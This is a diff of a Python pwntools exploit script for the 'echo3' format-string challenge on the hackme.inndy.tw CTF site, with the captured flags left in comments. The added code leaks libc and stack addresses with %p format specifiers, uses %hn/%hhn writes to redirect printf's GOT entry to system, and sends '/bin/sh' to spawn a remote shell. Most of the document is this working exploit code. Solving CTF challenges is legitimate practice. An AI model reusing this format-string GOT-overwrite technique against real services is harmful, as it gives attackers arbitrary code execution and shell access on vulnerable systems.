@@ -34,8 +34,15 @@ elf_name = path.join(path.dirname(path.abspath(__file__)), "echo3_patched")
 _, host, port = re.split("\s+", "nc hackme.inndy.tw 7720")
 
 elf = ELF(elf_name)
-# io = remote(host, port) if len(sys.argv) > 1 else process(elf_name)
 libc = elf.libc
+if len(sys.argv) > 1:
+    io = remote(host, port)
+    debug=False
+    context.log_level="info"
+else:
+    io = process(elf_name)
+    debug=True
+    context.log_level="debug"
 
 # 分组探测，是为了让数值相近的padding在一起。
 # 如果实际padding较小，但探测了较大的数值，越界会导致段错误。
@@ -114,37 +121,8 @@ class Actor:
             log.success("p1addr = 0x%x", self.p_addr[1])
             log.success("p2addr = 0x%x", self.p_addr[2])
             log.success("i_addr = 0x%x", self.i_addr)
-
         else:
             raise ValueError("Cannot locate ebp1addr or random_bytes!")
-
-    # def get_libc_and_stack_addr(self):
-    #     # 获取libc与栈地址
-    #     payload = "%18$p#%19$p#%34$p#%35$p$$$$$$$$\0"
-    #     self.io.sendline(payload)
-    #     r = self.io.recvuntil("$$$$$$$$", drop=True)
-    #     a = r.split(b"#")
-    #     assert a[1] == b"0x804877b" and a[2] == b"(nil)"
-    #     self.ebp1addr = int(a[0], 16)
-    #     log.info("ebp1addr = 0x%x", self.ebp1addr)
-    #     self.esp_addr = self.ebp1addr - self.random_bytes - 136
-    #     log.info("esp_addr = 0x%x", self.esp_addr)
-    #     libc_addr = int(a[3], 16)
-    #     log.info("libc_addr = 0x%x", libc_addr)
-    #     libc.address = (libc_addr - 0x18000) & 0xfffff000
-    #     log.info("libc_basse = 0x%x", libc.address)
-
-    # def get_var_i_addr(self):
-    #     # 获取变量i的地址
-    #     self.ebp0addr = self.esp_addr + 72
-    #     log.info("ebp0addr = 0x%x", self.ebp0addr)
-        
-    #     self.p0addr = self.esp_addr + 88
-    #     log.info("p0addr = 0x%x", self.p0addr)
-    #     self.p1addr = self.esp_addr + self.random_bytes + 316
-    #     log.info("p1addr = 0x%x", self.p1addr)
-    #     self.i_addr = self.ebp0addr - 0x14
-    #     log.info("i_addr = 0x%x", self.i_addr)
 
     def set_var_i_minus(self):
         # 修改变量i
@@ -153,66 +131,75 @@ class Actor:
         # 经测试，无法同时修改p1内容和i的内容
         assert (self.i_addr + 3) & 0xffff == (self.i_addr & 0xffff) + 3  # 为了修改最高位，使其变为负数
         bit4 = (self.i_addr + 3) & 0xffff
-        t = (0x80 - bit4) & 0xff
-        minus_data = t if t > 0 else 256
-        payload = "%{bit4}c%{p0idx}$hn%{minus_data}c%{p1idx}$hhn$$$$$$$$\0".format(
-            p0idx=self.p_idx[0], bit4=bit4,
-            p1idx=self.p_idx[1], minus_data=minus_data
-        )
+        payload = "%{bit4}c%{p0idx}$hn$$$$$$$$\0".format(p0idx=self.p_idx[0], bit4=bit4)
         self.io.sendline(payload)
-        self.io.recvuntil("$$$$$$$$", drop=True)
+        self.io.recvuntil("$$$$$$$$")
+        minus = 0x80
+        payload = "%{minus}c%{p1idx}$hhn$$$$$$$$\0".format(p1idx=self.p_idx[1], minus=minus)
+        self.io.sendline(payload)
+        self.io.recvuntil("$$$$$$$$")
 
-    # def write_printf_got_addresses(self):
-    #     self.p2addr = (self.p1addr & 0xffffff00) + 0x100
-    #     log.info("p2addr = 0x%x", self.p2addr)
-    #     self.p2idx = (self.p2addr - self.esp_addr) // 4
-    #     payload = "%{data}c%{p0idx}$hn$$$$$$$$\0".format(p0idx=self.p0idx, data=self.p2addr & 0xffff)
-    #     self.io.sendline(payload)
-    #     self.io.recvuntil("$$$$$$$$", drop=True)
+    def get_libc(self):
+        payload = "%{libc_idx}$p$$$$$$$$\0".format(libc_idx=35 + self.padding // 4)
+        self.io.sendline(payload)
+        addr = self.io.recvuntil("$$$$$$$$", drop=True)
+        libc_addr = int(addr, 16)
+        log.info("libc_addr = 0x%x", libc_addr)
+        libc.address = (libc_addr - 0x18000) & 0xfffff000
+        log.success("libc_base = 0x%x", libc.address)
 
-    #     a = elf.got["printf"]
-    #     gots = struct.pack("<IIII", a, a + 1, a + 2, a + 3)
-    #     for i in range(16):
-    #         if i > 0:
-    #             payload = "%{data}c%{p0idx}$hhn$$$$$$$$\0".format(p0idx=self.p0idx, data=(self.p2addr & 0xff) + i)
-    #             self.io.sendline(payload)
-    #             self.io.recvuntil("$$$$$$$$", drop=True)
-    #         payload = "%{data}c%{p1idx}$hhn$$$$$$$$\0".format(p1idx=self.p1idx, data=gots[i])
-    #         self.io.sendline(payload)
-    #         self.io.recvuntil("$$$$$$$$", drop=True)
+    def write_printf_got_addresses(self):
+        payload = "%{data}c%{p0idx}$hn$$$$$$$$\0".format(p0idx=self.p_idx[0], data=self.p_addr[2] & 0xffff)
+        self.io.sendline(payload)
+        self.io.recvuntil("$$$$$$$$")
 
-    # def write_system_to_printf_got(self):
-    #     a = libc.sym["system"]
-    #     l = [0]
-    #     for i in range(4):
-    #         byte = (((a >> (i * 8)) & 0xff) - sum(l)) & 0xff
-    #         if byte == 0:
-    #             byte = 256
-    #         l.append(byte)
-    #     l = l[1:]
-    #     payload = "".join(["%{}c%{}$hhn".format(data, self.p2idx + i) for i, data in enumerate(l)]) + "$$$$$$$$\0"
-    #     self.io.sendline(payload)
-    #     self.io.recvuntil("$$$$$$$$", drop=True)
+        a = elf.got["printf"]
+        gots = struct.pack("<IIII", a, a + 1, a + 2, a + 3)
+        for i in range(16):
+            if i > 0:
+                payload = "%{data}c%{p0idx}$hhn$$$$$$$$\0".format(
+                    p0idx=self.p_idx[0], data=(self.p_addr[2] & 0xff) + i
+                )
+                self.io.sendline(payload)
+                self.io.recvuntil("$$$$$$$$")
+            payload = "%{data}c%{p1idx}$hhn$$$$$$$$\0".format(p1idx=self.p_idx[1], data=gots[i])
+            self.io.sendline(payload)
+            self.io.recvuntil("$$$$$$$$")
 
-    # def main(self):
-    #     self.get_libc_and_stack_addr()
-    #     self.get_var_i_addr()
-    #     self.set_var_i_minus()
-    #     self.write_printf_got_addresses()
-    #     self.write_system_to_printf_got()
+    def write_system_to_printf_got(self):
+        a = libc.sym["system"]
+        l = [0]
+        for i in range(4):
+            byte = (((a >> (i * 8)) & 0xff) - sum(l)) & 0xff
+            if byte == 0:
+                byte = 256
+            l.append(byte)
+        l = l[1:]
+        payload = "".join(["%{}c%{}$hhn".format(data, self.p_idx[2] + i) for i, data in enumerate(l)]) + "$$$$$$$$\0"
+        self.io.sendline(payload)
+        self.io.recvuntil("$$$$$$$$")
 
     def main(self):
+        log.info("to detect random")
         self.detect_random()
+        log.info("set var i minus")
         self.set_var_i_minus()
+        log.info("get libc")
+        self.get_libc()
+        log.info("write_printf_got_addresses")
+        self.write_printf_got_addresses()
+        log.info("write_system_to_printf_got")
+        self.write_system_to_printf_got()
 
 def main():
-    io = remote(host, port) if len(sys.argv) > 1 else process(elf_name)
     actor = Actor(io)
     actor.main()
 
-    gdb.attach(io)
-    pause()
+    if debug:
+        gdb.attach(io)
+        pause()
 
+    io.sendline("/bin/sh\0")
     io.interactive()
 
 
@@ -220,4 +207,6 @@ def main():
 if __name__ == "__main__":
     main()
 
-# CTF{081ecc7c8d658409eb43358dcc1cf446}
+# FLAG{How did you solve this? Double pointer or a long output?}
+# cat exp-echo3.py
+# cat run.sh
